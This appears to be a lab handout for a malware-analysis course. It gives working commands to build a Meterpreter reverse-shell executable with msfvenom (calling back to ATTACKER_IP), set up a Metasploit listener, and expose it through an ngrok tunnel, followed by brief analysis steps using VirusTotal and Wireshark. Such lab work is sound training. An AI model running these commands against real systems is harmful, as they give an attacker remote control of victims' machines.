# Malware Payload Analysis (Week 8)

## Objective
Generate a reverse shell payload, deliver via Apache + ngrok tunnel, analyze with VirusTotal, monitor with TCPView/Wireshark, and document IOCs.

## Payload Generation
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o /var/www/html/evil.exe
```

## Listener
```bash
msfconsole -q
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST ATTACKER_IP
set LPORT 4444
run
```

## Delivery via ngrok
```bash
# Install ngrok and authenticate, then:
ngrok http 80
# or for raw TCP: ngrok tcp 4444
```

## Analysis
- Upload `evil.exe` to VirusTotal (do NOT upload real client samples).
- On victim VM: use TCPView to observe connections.
- Capture traffic with Wireshark.

## Deliverables
- VT results, PCAP snippets, persistence/IoCs list, and mitigation steps.

